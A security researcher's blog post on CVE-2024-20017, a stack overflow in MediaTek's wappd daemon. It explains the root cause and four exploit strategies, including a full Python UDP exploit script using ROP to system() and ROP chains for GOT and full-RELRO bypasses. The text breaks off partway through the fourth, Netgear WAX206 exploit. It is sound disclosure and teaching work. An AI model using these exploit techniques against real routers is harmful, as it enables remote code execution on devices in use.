=== Content from blog.coffinsec.com_281c59db_20250110_193025.html ===

 [hyprblog](/)
[trophies](/trophies.html)
[gpg](/assets/hypr.pub)
[github](https://github.com/mellow-hype)

# 4 exploits, 1 bug: exploiting cve-2024-20017 4 different ways

Aug 30, 2024

* [introduction](#introduction)
* [background](#background)
* [exploit 1: RIP hijack via corrupted return address, ROP to system()](#exploit-1-rip-hijack-via-corrupted-return-address-rop-to-system)
* [exploit 2: arbitrary write via pointer corruption, GOT overwrite](#exploit-2-arbitrary-write-via-pointer-corruption-got-overwrite)
* [exploit 3: return address corruption + arbitrary write via ROP (full RELRO)](#exploit-3-return-address-corruption--arbitrary-write-via-rop-full-relro)
* [exploit 4: WAX206 return address corruption + arbitrary r/w via pointer corruption](#exploit-4-wax206-return-address-corruption--arbitrary-rw-via-pointer-corruption)
* [bonus: triggering a kernel bug by performing arbitrary IOCTL calls via JOP](#bonus-triggering-a-kernel-bug-by-performing-arbitrary-ioctl-calls-via-jop)
* [wrapping up](#wrapping-up)
* [references](#references)

## introduction

Well, here we are. This post was meant to be finished around March of this year to coincide with the
publication of the vulnerability Iâm going to be writing about, [CVE-2024-20017](https://nvd.nist.gov/vuln/detail/CVE-2024-20017). Unfortunately, this
also ended up coinciding with me moving, starting a new job, and getting really busy at said job,
so here we are nearly 6 months later. This post is probably going to be one of my longest, so strap
in.

At the end of last year I discovered and reported a vulnerability in `wappd`, a network daemon that
is a part of the MediaTek MT7622/MT7915 SDK and RTxxxx SoftAP driver bundle. This chipset is
commonly used on embedded platforms that support Wifi6 (802.11ax) including Ubiquiti, Xiaomi, and
Netgear devices. As is the case for a handful of other bugs Iâve found, I originally came across
this code while looking for bugs on an embedded device: the Netgear WAX206 wireless router. The
`wappd` service is primarily used to configure and coordinate the operations of wireless interfaces
and access points using Hotspot 2.0 and related technologies. The structure of the application is a
bit complex but itâs essentially composed of this network service, a set of local services which
interact with the wireless interfaces on the device, and communication channels between the various
components, using Unix domain sockets.

* Affected chipsets: MT6890, MT7915, MT7916, MT7981, MT7986, MT7622
* Affected software: SDK version 7.4.0.1 and before (for MT7915) / SDK version 7.6.7.0 and before (for MT7916, MT7981 and MT7986) / OpenWrt 19.07, 21.02

The vulnerability is a buffer overflow caused by a copy operation that uses a length value taken
directly from attacker-controlled packet data without bounds checking. Overall itâs a pretty simple
bug to understand as itâs just a run-of-the-mill stack buffer overflow, so I thought Iâd use this
bug as a case study to explore *multiple* exploit strategies that can be taken using for this one
bug, applying different exploit mitigations and conditions along the way. I think this is
interesting as it provides an opportunity to focus on the more creative parts of exploit
development: once you know thereâs a bug, and you understand the constraints, coming up with all of
the different ways you can influence the logic of the application and the effects of the bug to get
code execution and pop a shell.

This post will go over 4 exploits for this bug, starting with the simplest version (no stack
canaries, no ASLR, corrupted return address) all the way up to an exploit written for the `wappd`
binary shipped on the Netgear WAX206, where multiple mitigations are enabled and we go from x86-64
to arm64. The code for the exploits can be found [here](https://github.com/mellow-hype/cve-2024-20017); its pretty heavily commented to help make
things clearer. It might help to keep those in sight while reading the post so Iâve included links
to the relevant exploit at the start of each section.

*NOTE: The first 3 exploits discussed below were written for a version of wappd I compiled myself
on an x86\_64 machine and with some slight modifications (different sets of mitigations, disabling
forking behavior, compiler optimization).*

## background

### discovery

This bug was discovered through fuzzing with a network-based fuzzer named [fuzzotron](https://github.com/denandz/fuzzotron) that I was trying
out for the first time. Check out the Github page for more info but tl;dr it can use `radamsa` or
`blab` for testcase generation and provides a quick way to fuzz network services with minimal
overhead. In the case of this target, I used `radamsa` for mutations and generated a starting corpus
manually using Python to define the structure of the expected packet data and write it to disk. I
also made a minor modification to the `wapp` daemon code so that it saved a copy of the last packet
it received to disk as soon as it came in to ensure crashing cases could be saved for triage.

### root cause analysis

The vulnerability occurs due to a lack of bounds checking in `IAPP_RcvHandlerSSB()` prior to using
an attacker-controlled value in a call to `IAPP_MEM_MOVE()` (a wrapper around `NdisMoveMemory()`)
to copy data into a 167-byte stack-allocated structure.

After reading data from either the UDP or TCP socket in `IAPP_RcvHandlerUdp()` or `IAPP_RcvHandlerTcp()`,
respectively, the raw data is cast to `struct IappHdr` and the `command` field is checked; if this
is command `50`, the `IAPP_RcvHandlerSSB()` function will be reached and passed a pointer to the raw
data received from the socket. Inside `IAPP_RcvHandlerSSB()`, the data is cast to
`struct RT_IAPP_SEND_SECURITY_BLOCK *` and assigned to the pointer `pSendSB`; `pSendSB->Length` is
then accessed and used to calculate the length of the data attached to the struct. After copying the
payload data from the cast struct pointer to the `pCmdBuf` pointer that is also passed in as an
argument, a call to the macro `IAPP_MEM_MOVE()` is made (last line in the snippet below) using the
value of the attacker-controlled `Length` field to write from the `pSendSB->SB` buffer field to the
`kdp_info` struct declared at the start of the function. Prior to this call, the only bounds check
done on this value is to check that it does not exceed the maximum packet length of 1600 bytes. As
the size of the destination `kdp_info` struct is only 167 bytes, this results in a stack buffer
overflow of up to 1433 bytes of attacker-controlled data.

The vulnerable code snippet from `IAPP_RcvHandlerSSB()` is shown below:

```
  pSendSB = (RT_IAPP_SEND_SECURITY_BLOCK *) pPktBuf;

  BufLen = sizeof(OID_REQ);
  pSendSB->Length = NTOH_S(pSendSB->Length);
  BufLen += FT_IP_ADDRESS_SIZE + IAPP_SB_INIT_VEC_SIZE + pSendSB->Length;

  IAPP_CMD_BUF_ALLOCATE(pCmdBuf, pBufMsg, BufLen);
  if (pBufMsg == NULL)
    return;
  /* End of if */

  /* command to notify that a Key Req is received */
  DBGPRINT(RT_DEBUG_TRACE, "iapp> IAPP_RcvHandlerSSB\n");

  OidReq = (POID_REQ) pBufMsg;
  OidReq->OID = (RT_SET_FT_KEY_REQ | OID_GET_SET_TOGGLE);

  /* peer IP address */
  IAPP_MEM_MOVE(OidReq->Buf, &PeerIP, FT_IP_ADDRESS_SIZE);

  /* nonce & security block */
  IAPP_MEM_MOVE(OidReq->Buf+FT_IP_ADDRESS_SIZE,
        pSendSB->InitVec, IAPP_SB_INIT_VEC_SIZE);
  IAPP_MEM_MOVE(OidReq->Buf+FT_IP_ADDRESS_SIZE+IAPP_SB_INIT_VEC_SIZE,
        pSendSB->SB, pSendSB->Length);
  // BUG: overflow occurs here
  IAPP_MEM_MOVE(&kdp_info, pSendSB->SB, pSendSB->Length);

```
### code flow from source to sink

The code flow from input to the vulnerable function is:

* `IAPP_Start()` starts the main processing loop that calls `IAPP_RcvHandler()`
* `IAPP_RcvHandler()` calls `select()` to find ready socks and calls the appropriate protocol handler function for each sock that is ready
* Assuming the packet is received over UDP, `IAPP_RcvHandler()` will call `IAPP_RcvHandlerUdp()`, passing in a pointer `pPktBuf` to be used to store the data received
* `IAPP_RcvHandler()` calls `recvfrom()` to read data from the UDP socket and, assuming the data is successfully read, casts the data to `struct IappHdr` and checks the `command` field; if the value is `0x50`, `IAPP_RcvHandlerSSB()` is called to handle the request
* `IAPP_RcvHandlerSSB()` will then use the raw packet data as described above, using the `Length` field of the `RT_IAPP_SEND_SECURITY_BLOCK` struct embedded in the packet in a call to `IAPP_MEM_MOVE` (wrapper for `NdisMoveMemory()`), which will write from an offset of the packet data to a stack-allocated struct `kdp_info`. This is where the overflow occurs.

### overview of the injection point

Before going into the details of exploitation lets take a second to review the injection point where
the corruption occurs, the expected payload format, and the constraints that exist.

The max size that will be read from the UDP socket by the application is 1600 bytes, so this is the
max size of the payload we can send. Accounting for the portions of the payload that must be present
to reach the vulnerable code, this gives us about 1430 bytes we can use to corrupt other data. The
definition of the `RT_IAPP_HEADER` and `RT_IAPP_SEND_SECURITY_BLOCK` structs are shown below. The
former is embedded into the latter and this represents the format that requests are expected to
arrive in; the application will cast the data read from the socket directly to these types.

```
/* IAPP header in the frame body, 6B */
typedef struct PACKED _RT_IAPP_HEADER {
  UCHAR Version;  /* indicates the protocol version of the IAPP */
  UCHAR Command;  /* ADD-notify, MOVE-notify, etc. */
  UINT16  Identifier; /* aids in matching requests and responses */
  UINT16  Length;   /* indicates the length of the entire packet */
} RT_IAPP_HEADER;

typedef struct PACKED _RT_IAPP_SEND_SECURITY_BLOCK {
  RT_IAPP_HEADER  IappHeader;
  UCHAR     InitVec[8];
  UINT16      Length;
  UCHAR     SB[0];
} RT_IAPP_SEND_SECURITY_BLOCK;

```

The main payload section of the `RT_IAPP_SEND_SECURITY_BLOCK` is in the `SB[]` field; data is
appended directly to the tail of this struct and the size of this payload is meant to be stored in
the `Length` field of the struct. In order to pass other validation checks, the `Length` field of
the `IappHeader` struct should be kept small; in my payloads I use a size of `0x60`. Finally, the
`RT_IAPP_HEADER.Command` field must be set to `50` in order to reach the vulnerable handler
`IAPP_RcvHandlerSSB`.

Other than these basic constraints/requirements, there arenât any other issues to work around like
avoiding null bytes or other restricted values.

## exploit 1: RIP hijack via corrupted return address, ROP to system()

* Build: non-forking, no optimizations
* Mitigations: NX

Weâll first start with the simplest path to achieve code execution, assuming *no* expoit mitigations
are in place (except non-executable stack). This means addresses are predictable and no leak is
necessary.

This exploit is a classic RIP hijack, using the stack overflow to corrupt the saved return address
and redirect execution. This is about as straightforward as it gets: overflow the stack, align the
overflow to corrupt the saved return address with the desired address to jump to, and wait for the
function to return and use the corrupted value. What you jump to and how you leverage that to get
more control is a blank canvas (for the most part). In the case of this exploit, we keep it simple
by using the corruption to jump to a ROP gadget that will pop a pointer to a string containing a
command to run into the correct registers, and then call `system()` to have the command executed.
As ASLR isnât enabled, we assume knowledge of the address of `system()` and a stack address close
to where our payload data will be.

```
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

TARGET_IP = "127.0.0.1"
TARGET_PORT = 3517
PAD_BYTE = b"\x22"

# this is addr on the stack close to where our paylaod data is
WRITEABLE_STACK = 0x7fffffff0d70

# Addresses
SYSTEM_ADDR     = 0x7ffff7c50d70
EXIT_ADDR       = 0x7ffff7c455f0
TARGET_RBP_ADDR = 0x5555555555555555  # doesn't matter
GADGET_2        = 0x42bf72  # pop rdi ; pop rbp ; ret

# NOTE: tweak `stack_offset` if env changes and exploit isn't finding command string; +/- 0x10-0x40
# should usually do it.
def create(stack_offset=0x1b0):
    # iapp header
    header = p8(0)      # version
    header += p8(50)    # command
    header += p16(0)    # ident
    header += p16(0x60) # length

    # SSB struct frame
    ssb_pkt = p8(55) * 8     # char buf[8], InitVec
    ssb_pkt += p16(0x150, endian='big')  # u16 Length

    # Main payload
    final_pkt = header + ssb_pkt
    final_pkt += PAD_BYTE * 176
    final_pkt += p64(WRITEABLE_STACK)
    final_pkt += PAD_BYTE * 16
    final_pkt += p64(WRITEABLE_STACK)

    # RBP OVERWRITE
    final_pkt += p64(TARGET_RBP_ADDR)

    # Core Exploit
    # this will be the first place execution will be redirected; will load the next value into $rdi
    final_pkt += p64(GADGET_2)
    # pointer to the command string defined a few lines down
    final_pkt += p64(WRITEABLE_STACK - stack_offset)
    final_pkt += PAD_BYTE * 8
    # address to system to jump to for code exec
    final_pkt += p64(SYSTEM_ADDR)

    # address to exit() cleanly upon return
    final_pkt += p64(EXIT_ADDR)
    # command to run through system()
    final_pkt += b"echo LETSGO!!!\x00"
    return final_pkt

# send payload bytes to target
final_pkt = create()
conn = remote(TARGET_IP, TARGET_PORT, typ='udp')
conn.send(final_pkt)

context.log_level = 'info'
log.info(f"sent payload to target {TARGET_IP}:{TARGET_PORT} ({len(final_pkt)} bytes)")

```

On a successful run, the output of the iappd daemon will show a failed call to bash and then print
out the string âLETSGO!!!â, demonstrating the successful execution of `echo`, and then exits
cleanly.

(Un)fortunately, these days youâre almost guaranteed to find stack cookies and ASLR in use on
embedded platforms, which will prevent such trivial exploitation. In those cases, youâll need an
info leak to (hopefully) leak the cookie value or youâll just have to move onto other techniques
that donât rely on corrupting the saved return address.

---

## exploit 2: arbitrary write via pointer corruption, GOT overwrite

* Build: x86\_64, non-forking, no optimizations
* Mitigations: ASLR, stack canaries, NX, partial RELRO
* [Exploit code](https://github.com/mellow-hype/cve-2024-20017/blob/main/x86_64/x86_64_partial_relro_got.py)

Continuing from where the previous section left off, letâs say at least stack canaries and ASLR are
enabled and the exploit above is no longer viable. Since we donât have an info leak, letâs shift the
focus from corrupting the saved return address on the stack and consider what else could be achieved
with the corruption weâre able to cause *before* reaching the stack canary.

As you may already know, the locally declared variables for a function are stored in the stack frame
for that function, immediately ahead of the saved return address and base pointer address. The
variables that sit between the end of the overflowed buffer and the start of the previous stack
frame will be corrupted by the overflow. Depending on how those values are used in the code that
executes after weâve corrupted memory, it may be possible to abuse the effects of the corruption to
accomplish gain further control.

Below are the locally declard variables for the vulnerable function `IAPP_RcvHandlerSSB()`:

```
  RT_IAPP_SEND_SECURITY_BLOCK *pSendSB;
  UCHAR *pBufMsg;
  UINT32 BufLen, if_idx;
  POID_REQ OidReq;
  FT_KDP_EVT_KEY_ELM kdp_info;

```

The `kdp_info` struct is the one that will be overflowed from the effects of the bug, and all of the
variables declared before it can be corrupted. Of particular interest in these situations are
pointers, which could potentially be abused to get a powerful write primitive â if we alter where a
pointer points to, any assignments or writes that the applications performs using that pointer will
result in data being written to an arbitrary address of our choice.

In this case, only a few lines of code remain which make use of the variables after the corruption
is triggered by the call to `IAPP_MEM_MOVE()`. These lines are show in the snippet below:

```
  IAPP_HEX_DUMP("kdp_info.MacAddr", kdp_info.MacAddr, ETH_ALEN);
  if_idx = mt_iapp_find_ifidx_by_sta_mac(&pCtrlBK->SelfFtStaTable, kdp_info.MacAddr);
  if (if_idx < 0) {
    DBGPRINT(RT_DEBUG_TRACE, "iapp> %s: cannot find wifi interface\n", __FUNCTION__);
    return;
  }

  OidReq->Len = BufLen - sizeof(OID_REQ);

  IAPP_MsgProcess(pCtrlBK, IAPP_SET_OID_REQ, pBufMsg, BufLen, if_idx);

```

The most interesting of these is the assignment to `OidReq->Len` using the value in `BufLen`: the
former is an access that will dereference a pointer we can corrupt (`OidReq`), and the latter is an
access of an int32 value that we can also control (`BufLen`). In other words, we control both sides
of the assignment expression and can write an arbitrary 4-byte value to an arbitrary address.

So, what can we accomplish with this primitive? There are multiple strategies that might work at
this point and this is where the creativity in exploit development comes in. If our ultimate goal is
to execute `system()` to execute shell commands, weâll generally have to do the following:

1. Get the command string we want executed into memory at a *known* address
2. Get the pointer to that string placed into the appropriate register to be passed as the first argument to `system()` (i.e. put into `rdi` on x86\_64)
3. Redirect execution to `system()`

The exploit linked above applies this concept to corrupt the `OidReq` pointer and uses the 4-byte
write primitive to iteratively write a shell payload into a segment of the GOT (**1**); as the
binary is built with no PIE and only partial RELRO, the GOT is always at a predictable address and
writeable, so we can use it as a buffer for our payload. The only constraint on this is that we must
avoid overwriting GOT entries for functions that will get called somewhere along the execution path
to the vulnerable code, as this would result in a crash before the exploit has finished. The exploit
sends multiple corruption payloads to write the shell command, adjusting the corrupted `OidReq`
pointer on each request by +4 bytes to turn the 4-byte write into an arbitrary write-what-where. The
exploit then uses the 4-byte write to corrupt the GOT entry of `read()` with the address of a ROP
gadget that kicks off a ROP chain to adjust the stack, pop the address of the shell payload in the
GOT into `$rdi` (**2**), and then jumps to the call to `system()` (**3**) located in
`IAPP_PID_Kill()` to have the shell payload executed. `read()` was chosen as the GOT entry to
corrupt to redirect execution as itâs not in the execution path of the vulnerable code and we can
trigger it on-demand by sending a request over TCP since the handler for TCP connections uses
`read()` rather than `recvfrom()`; all of the earlier payloads are sent over UDP.

One important bit in the way this exploit works is that the redirection of execution happens async
from the payload that caused the corruption â itâs only triggered when we send the final TCP
request to causes the corrupted GOT entry for `read()` to be called, which means none of our
controlled data is at the top of the stack and none of the data we send in the TCP packet is ever
actually read (since `read()` is gone). This is a problem since we need to have controlled values at
the top of the stack after the first ROP gadget returns so that we can retain control of execution.
This is where a bit of luck comes in â in this case, weâre able to find some of the payload data
from the earlier requests that were sent about 40 bytes below the top of the stack frame (the stack
isnât cleared between functions/uses), so weâre able to reach the payload data by popping 5 values
from the stack before doing anything else.

This exploit avoids corrupting the stack metadata at all, so stack canaries donât come into play. It also
only makes use of predictable addresses and ROP to avoid dealing with ASLR, so no leak is needed.

![mtk-wapp-exploit2.png](/assets/images/mtk-wapp-exploit2.png)

---

## exploit 3: return address corruption + arbitrary write via ROP (full RELRO)

* Build: x86\_64, optimization level 2, forking daemon
* Mitigations: ASLR, full RELRO, NX
* [Exploit code](https://github.com/mellow-hype/cve-2024-20017/blob/main/x86_64/x86_64_full_relro.py)

So, the last exploit was able to get around the stack canaries and ASLR by using pointer corruption
to get an arbitrary write primitive, which was needed to allow us to write controlled values into
the GOT so that we would know the address of that data for use later in the exploit. But what if
that there wasnât a pointer nearby for us to corrupt to get that arbitrary write? Well, it turns out
that if the application is built with optimization level set to 2 (`-O2`), various functions along
the execution path to the vulnerable code get inlined into one big function running within the scope
of `IAPP_RcvHandler()`, resulting in changes to the stack layout and ordering of variables. This
ends up making it impossible to corrupt the `OidReq` pointer that we previously relied on for the
arbitrary write, so another approach must be found.

Since we lost the write primitive we used in the previous exploit, weâll disable stack canaries on
this version to give us a code redirection primitive to start with (we need to have *something* to
start with). This example is meant to demonstrate a way of getting an arbitrary write primitive from
a code exec primitive, as itâs not usually enough to be able to *just* redirect execution, so having
both will always make things much easier. To keep things interesting, weâll enable full RELRO so
that the GOT and PLT sections are no longer writeable.

### arbitrary write via ROP

The first thing we need to do given the new restrictions is find a way to get an arbitrary write
primitive to allow us to write our command payload at a predictable address. Since we can influence
the flow of execution, our best bet is going to be to use ROP to get it. As with any exploit that
relies on ROP, thereâs a certain amount of luck involved in that the binary your exploit is written
against needs to contain the required ROP gadgets within the main executable (shared objs will be
affected by ASLR).

If we think about how the previous r/w primitive worked, there was a pointer value being
dereferenced and a value assigned (i.e. written) to the memory it pointed to. What would this look
like in assembly? Probably something like this:

```
	mov rax, [rsp+0x30];     # read a value from some address into $rax
	mov [rax], rbx;          # write the value of $rbx to the address pointed to by the value in $rax (deref $rax as pointer)

```

So, if we can find a gadget (or gadgets) that will allow us to do this kind of operation and we can
control the values that are used for both sides of the operation, we should be able to get an
arbitrary write primitive. And, it turns out, luck is on our side! The gadget below (`GADGET_A`) is
available:

**GADGET\_A**

* `0x405574`:
  + `mov rdx, QWORD PTR [rsp+0x50];`: read a value at `$rsp+0x50` (top of stack+80) into `$rdx`
  + `mov QWORD PTR [rdx], rax`: dereference `$rdx` as a pointer and write the value in `$rax` to that location
  + `xor eax, eax;`: 0 out lower 32 bits of `$rax`
  + `add rsp; 0x48`: shift stack up by `0x48` bytes
  + `ret;`: return

Great! This gets us most of the way there. But first, we need to find a way to get controlled
values into `$rax` as that will be what gets written to the address in `$rdx`. To do this, we need
to find a gadget that will take a value from the stack and put it into `$rax`, same as before. This
is usually easy enough as `pop` operations happen all over the place and the odds are at least one
of them pops to `$rax`. This is the gadget I chose to go with for this exploit (`GADGET_B`):

**GADGET\_B**

* `0x0042acd8: pop rax; add rsp, 0x18; pop rbx; pop rbp; ret;`
  + `pop rax;`: pop the value at the top of the stack into `$rax`
  + `add rsp, 0x18;`: increment `$rsp` by `0x18 (24)` bytes; will need +24 bytes of padding to account for this operation
  + `pop rbx; pop rbp;`: pop the next two values from the (new) top of the stack into `$rbx` and `$rbp`, respectively; will need +16 bytes of padding to account for this operation
  + `ret;`: return

Chaining the second gadget with the first one gets us everything we need! We can now write an
arbitrary 8-byte value to an arbitrary address, assuming we control the values at the top of the
stack when execution is redirected (which we will since we corrupt the saved return address, which
is at the top of the stack). Hereâs what the payload for this chain would look like, including the
padding needed to account for the instructions that modify the stack pointer.

```
GADGET_B
value_to_write ; popped into rax
padding[40]    ; account for 2 pops and a +0x18 shift to rsp
GADGET_A       ; value jumped to after ret from GADGET_B; read $rsp+50 into rdx
padding[72]    ; account for rsp+0x48
<next_jump_addr> ; addr jumped to after ret from GADGET_A
addr_to_write_to ; value read into $rdx in the start of GADGET_A

```

Similar to the previous exploit, this ROP chain can be inserted multiple times to write more than 8
bytes starting at a target address, but in order to do this, thereâs one more gadget that is needed
to deal with a minor nuance in how `GADGET_A` interacts with the stack.

The first gadget we discuss above (`GADGET_A`) pops the value at `$rsp+0x50` into `$rdx`, so our
payload needs to place the address we want to write to at a `+0x50` byte offset from where this
gadget is in the payload. It then shifts the stack up by `+0x48`, leaving the stack pointer pointing
to the value right *before* the value we use as the write destination. This means the address of the
next gadget needs to be placed at `+0x48` so that it will be used when `ret` is reached; if we want
to perform *another* write, this would be the address for `GADGET_B`, and this is where the issue
comes up. After jumping to `GADGET_B`, it will pop the next value from the top of the stack
(`[$rsp]`) into `$rax`, but since `GADGET_A` shifted the stack pointer by `+0x48`, when the `ret` is
reached in `GADGET_A` the value of `$rsp` is incremented by 8 and left pointing to offset `+0x50`
(the value we pass as the write destination), and this is the value that `GADGET_B` would end up
popping into `$rax`. Thatâs not what we want, but thankfully thereâs a simple way to solve this
problem: instead of jumping directly to `GADGET_B` at the end of the first chain, we jump to another
gadget that will pop a single value from the stack (thereby incrementing `$rsp` to `+0x58`) and
weâll place the address to `GADGET_B` there so that we jump to it when this gadget returns.

So, taking that into account, this is how the `GADGET_B+GADGET_A` sub-chain(?) would be chained
multiple times:

```
>GADGET_B
value_to_write     ; popped into rax
padding[40]        ; account for 2 pops and a +0x18 shift to rsp
>GADGET_A          ; value jumped to after ret from GADGET_B; read $rsp+50 into rdx
padding[72]        ; account for rsp+0x48
>POP_RET_GADGET    ; addr jumped to after ret from GADGET_A; pop-ret so GADGET_B 8 bytes up is next ret address and not addr_to_write_to
addr_to_write_to   ; value read into $rdx in the start of GADGET_A;
--
>GADGET_B
value_to_write     ; popped into rax
padding[40]        ; account for 2 pops and a +0x18 shift to rsp
>GADGET_A          ; value jumped to after ret from GADGET_B; read $rsp+50 into rdx
padding[72]        ; account for rsp+0x48
>POP_RET_GADGET    ; addr jumped to after ret from GADGET_A; pop-ret so GADGET_B 8 bytes up is next ret address and not addr_to_write_to
addr_to_write_to   ; value read into $rdx in the start of GADGET_A
--
...
--
>GADGET_B
value_to_write
padding[40]
>GADGET_A
padding[72]
>FINAL_JUMP_DEST   ; addr jumped to after arbitrary write is done
addr_to_write_to

```

If this last part was hard to follow, donât worry about it (it was also hard to write). The
important part is that rather than jumping directly back to `GADGET_B` when linking multiple
instances of the chain, we instead jump to a gadget that will pop a value from the stack and then
return to jump to `GADGET_B` . This is done to ensure the values in the payload are properly
adjusted between iterations through the chain.

### dealing with full RELRO

Having acquired the write primitive we needed, we can use the same strategy as the previous exploit
to write our shell payload at a predictable address, with a slight modification. As we can no longer
write into the GOT or PLT segments due to full RELRO, we instead write the shell command passed to
`system()` in the only remaining writeable segments that have static/predictable addresses (assuming
no PIE) â the .bss and .data segments. Once thatâs done, the exploit jumps to a final ROP chain
that places the address where we wrote the command into `$rdi` and jumps to `system()` via the GOT
symbol so we donât need to leak the libc address.

We get command execution and use it to pop a reverse shell.

![mtk-wapp-exploit3.png](/assets/images/mtk-wapp-exploit3.png)

---

## exploit 4: WAX206 return address corruption + arbitrary r/w via pointer corruption

* Build: aarch64, build shipped with Netgear WAX206
* Mitigations: full RELRO, ASLR, NX, stack canaries\*
* [Exploit code](https://github.com/mellow-hype/cve-2024-20017/blob/main/WAX206-aarch64/wax-rip-system-rop.py)

Weâve made it to the final exploit! For this one weâre going to switch things up a bit and move on
to a real-world target: the version of wappd shipped on the [Netgear
WAX206](https://www.netgear.com/support/product/wax206/). This version is compiled for aarch64 and
has ASLR, NX, full RELRO, and stack cookies enabled. I think it offers some valuable insight into
the differences between writing exploits in controlled environments vs. writing them against
real-world targets â things often change in important ways that force you to adapt.

### the story

Iâm going to switch up the writing style for this section and use more of a narrative
format so that I can provide some context by walking through the process of how I figured everything
out. This exploit was a bit of a challenge to figure out and I think the process is best told as a
story. After that weâll switch back to the style used in the preceding sections.

*DISCLAIMER: This is the first time Iâve written this kind of exploit for an arm64 target and I had
to learn a lot of the stuff mentioned below along the way. For this reason, you should take the
details with a grain of salt as theyâre my current understanding of how/why things worked a certain
way but they might not be 100% accurate. If you notice anything thatâs incorrect please let me
know!*

#### important changes

Iâll start this section by going over some of the important differences for
this target and the previous ones, and how that ultimately impacted the final exploit.

The first major change was a difference in the optimization and inlining of code in the binary.
Whether it was the result if different compiler versions, architectural differences, or something
else, Iâm ultimately not sure. But the outcome was that the layout of stack variables changed and
the ability to corrupt the `OidReq` pointer that was previously targeted was no longer viable,
similar to **exploit 3**. So, this meant there was no arbitrary write primitive to start with. What
about a code redirection primitive (which the previous exploit relied on to get the write
primitive)?

This is where the next important difference comes in: arm64âs way of handling function returns. In
arm64, the return address is usually expected to be in the `x30` register and it will only be pushed
onto the stack for nested function calls that will need to overwrite it. I learned this the hard way
when I attached to the process with GDB and could see my target jump address correctly placed on the
stack to be used on the next returnâ¦and then saw it go completely ignored when the function hit
the final `ret` and used the value in `x30` without touching the stack. The inlining mentioned above
resulted in various function calls along the path of the vulnerable code getting inlined into one
massive function, eliminating basically every opportunity to corrupt a return address on the stack
which would be used in a `ret` (inlined functions donât `ret`). To top it all off, the *only* stack
frame that did have a saved return address that could be corrupted and that would actually be used
was for the main request processing loop â which runs infinitely and wonât return unless a SIGTERM
signal is caught (weâll come back to this shortly). There is a ton of nuance for each of these
changes and their effect on the final exploit, but tl;dr, this meant needing to go back to the
drawing board to come up with a new exploit strategy.

The *one* piece of good news was that even though `checksec` reports that the binary has stack
canaries enabled, analyzing it in Binja showed that the cookie-checking logic inserted by the
compiler was only present in two functions, and those were from an external library. This meant that
I wouldnât actually have to worry about stack cookies at all! Too bad corrupting saved return
addresses seems to be out of the question given the conditions described in the previous
paragraphâ¦

#### arbitrary write via pPktBuf pointer corruption

Based on the way Iâd approached the previous exploits, I figured there had to be a way to corrupt a
pointer somewhere so thatâs what I tackled first. After spending a bit of time doing some debugging
live on the WAX206 and testing different payloads, I eventually found that I could overwrite three
of the pointers defined in `IAPP_RcvHandler()`: `pPktBuf`, `pCmdBuf`, and `pRspBuf`. The first of
these, `pPktBuf`, points to the buffer that is used to store the inbound request data read from the
network â corrupting this pointer allows us to point it to an arbitrary location and then have the
entire contents of a subsequent request (up to 1600 bytes) written to that location. Great!

Interestingly, it was the effects of the inlining and arm64 semantics mentioned above that made it
possible to reach these pointers at all â under normal circumstances, writing far enough to reach
them would result in corrupting the stack frames for both `IAPP_RcvHandlerSSB()` and
`IAPP_RcvHandlerUdp()`, and cause a premature crash before the corrupted pointers could be used
again. In this case, `IAPP_RcvHandlerUdp()` is inlined directly into `IAPP_RcvHandler()` (so no
return address is used) and `IAPP_RcvHandlerSSB()` is able to get through itâs execution without
having to push/pop itâs return address value onto the stack where it could be corrupted.

So, I now had a write primitive of up to 1600 bytes to a controllable location. That should be
enough to get over the finish line, right?

#### when arbitrary write isnât enough

What exploit strategies are viable to achieve code execution when starting with only an arbitrary
write? Taking into account the mitigations present (namely ASLR) and assuming no leak is available,
thereâs really only one option in this case: corrupt some data *located at a predictable/known
address* which will either result in code execution directly (e.g. overwriting a function pointer)
or create conditions that will result in additional corruption that can be leveraged to take control
of execution. So, here we return to the concept discussed in **exploit 2**: finding corruptable data
that will be used by the application in a way that can be exploited.

Iâll save you the time (and frustration) of going over every possible avenue I went down looking for
this next piece and just tell you now: there was *nothing*. While there were multiple global
structures filled with function pointers, none of them are used within the request processing loop.
The data portions of some other data structures with viable targets also are unused. Full RELRO
means corrupting GOT/PLT entries is also out. And this brings us the main point here: sometimes even
arbitrary write primitives will *not be enough* to gain code execution. Iâm of the mind that itâs
always a good idea to follow every thread and try every possible angle during exploit dev, but the
reality is that sometimes, there just isnât any. Valid vulnerabilities that are exploitable in one
environment will not always be exploitable in another; everything matters. Which is why I also
follow the motto âexploit or GTFOâ â unless impact has been shown against the real target with a
real exploit, little can be said about the *real-world impact* of a vulnerability.

#### accepting defeat: the exploit will only work on termination

As mentioned in the **important changes** section, there was *one* return address that could be
corrupted: the one for `IAPP_RcvHandler()`. The issue was that this function only returns on process
termination when a SIGTERM is caught and handled. Iâd initially ignored this since thereâs no way to
force this termination as a remote attacker but, having hit a dead-end on finding another execution
primitive, I had to accept defeat and just decided to write the exploit with the assumption that the
process would terminate and hit the corrupted return address. The end of this post would be pretty
anticlimactic if I just stopped here, right?

### final exploit overview

Having gone over all of the important bits of the process that eventually led to the final exploit,
weâll now switch back to the present and talk about how the exploit works. Given that this post is
already pretty long, Iâll avoid going over *every* detail of how the final exploit came together and
instead focus on the parts that I think are most interesting or important (feel free to reach out on
twitter if you have any follow up questions). This one reuses a few of the concepts that were
covered in previous exploits, including using pointer corruption to get a write primitive, using the
.bss/.data segment as a buffer for the main payload, and leveraging ROP (technical JOP, in this
case) to set up the arguments for calling `system()` to get command execution.

To summarize where weâre starting from:

* We have an arbitrary write primitive of up to 1600 bytes via corruption of the `pPktBuf` pointer
* We have a way to redirect code execution via corruption of the saved return address in the stack frame for `IAPP_RcvHandler()` (but this will only be triggered when the process receives a SIGTERM signal)

The exploit is split up into two requests: one that corrupts the `pPktBuf` pointer to set up the
write primitive and another that uses the write primitive to write the shell payload and some other
data into a known memory region for later use.

The first one is pretty straightforward as all that really needs to be done is send a payload large
enough to overflow up to the `pPktBuf` pointer and make it point to the start of the .bss segment in
memory. As this pointer is used to store incoming request data, the contents of the *next* request
we send will be written to that address. Apart from corrupting this pointer, the first payload also
corrupts the `pCmdBuf` pointer, which is used to store data parsed out of the packet we send. As
such, `pCmdBuf` needs to point to a writeable segment of memory to avoid crashing or prematurely
aborting, so we overwrite it to also point to an offset into the .bss, but far enough to ensure it
wonât affect the payload sent in the second request.

The second request is where the real action happens. Having set up the write primitive with the
first request, this new payload needs to accomplish the following:

1. Write our shell command to a location we can reference when we call `system()`
2. Corrupt the saved return address to redirect code execution to a ROP gadget used to set up the argument to `system()`
   * ROP/JOP gadget does:
